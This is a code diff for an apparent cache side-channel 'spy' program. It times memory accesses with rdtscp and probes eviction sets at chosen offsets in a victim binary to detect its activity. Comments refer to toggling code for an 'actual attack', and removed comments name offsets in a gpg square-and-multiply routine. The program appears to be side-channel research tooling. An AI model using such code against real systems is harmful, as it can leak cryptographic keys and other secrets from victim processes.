@@ -22,7 +22,7 @@ typedef struct targets{
     Target **addresses;
 } Targets;
 
-#define MSRMT_BUFFER 1000000
+#define MSRMT_BUFFER 10000000
 #define MAX_TARGETS 5
 
 // Return the locations of address offsets in a file at path file_name. Sets adrs, mapping, map_len in Target.
@@ -158,36 +158,35 @@ void my_monitor(Config *spy_conf, Targets *targets){
     __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
     const char *output_filename = "./output_evict_time.log";
     create_empty_file(output_filename);
-    int debug =targets->number;
+    int first=targets->number;
     while(1)
     {
         old_tsc = tsc;
         __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
         while (tsc - old_tsc < 2500) __asm__ __volatile__ ("rdtscp" : "=A" (tsc));// TODO why 2500/500 cycles per slot now, depending on printf
 
+        // probe
         for(size_t i=0; i<targets->number; i++){
             targets->addresses[i]->msrmts[ctr]= probe_evset_single(targets->addresses[i]->adrs);
         }
 
+        // evict
         for(size_t i=0; i<targets->number; i++){
-            if(debug>0) printf("%lu, %lx, %p\n", i, targets->addresses[i]->offset, targets->addresses[i]->evset);
-            if(debug-->0) list_print(targets->addresses[i]->evset);
+            if(first>0) printf("%lu, %lx, %p\n", i, targets->addresses[i]->offset, targets->addresses[i]->evset);
+            if(first-->0) list_print(targets->addresses[i]->evset);
             probe_evset_chase(spy_conf, targets->addresses[i]->evset);
-
-            // TODO find different solution
-            // if(targets->addresses[i]->msrmts[ctr] < spy_conf->threshold) printf("[i] my_monitor: detected 0x%lx: ctr %d, hit ctr %d\n", targets->addresses[i]->offset, ctr, ++hit_ctr[i]);
+            // toggle during actual attack
+            if(targets->addresses[i]->msrmts[ctr] < spy_conf->threshold) printf("[i] my_monitor: detected 0x%lx: ctr %d, hit ctr %d\n", targets->addresses[i]->offset, ctr, ++hit_ctr[i]);
         }        
 
         if(ctr++ >= MSRMT_BUFFER) {
             ctr=0;
-
-            // Write back results
+            // Write results to file
             append_output(targets, output_filename);
-            break;
+            break; // toggle for actual attack
         }
     }
     printf("finished\n");
-    // unreachable
     close_spy(spy_conf, targets);
 }
 
@@ -209,14 +208,9 @@ void spy(char *victim_filepath, char *offset_filepath){
 
 int main(int ac, char **av){  
     if(ac!=3) {
-        printf("Use evict_time [TARGET] [ANYTHING]\n");
+        printf("Usage: evict_time [PATHTO_TARGET_FILE] [PATHTO_OFFSET_FILE]\n");
         return 0;
     }
-    // int my_target = 0xd57ed; 
-    // int my_target = 0x1136;
-    //0x116f-0x11b4 victim_loop2, loop itself 0x118a - 0x11a8, take 0x118a alder lake
-    //0xd57ed madgpg sqr, 0xd571f mul
-    // loop2 skylake 0x118a
     spy(av[1], av[2]);
     return 0;
 }
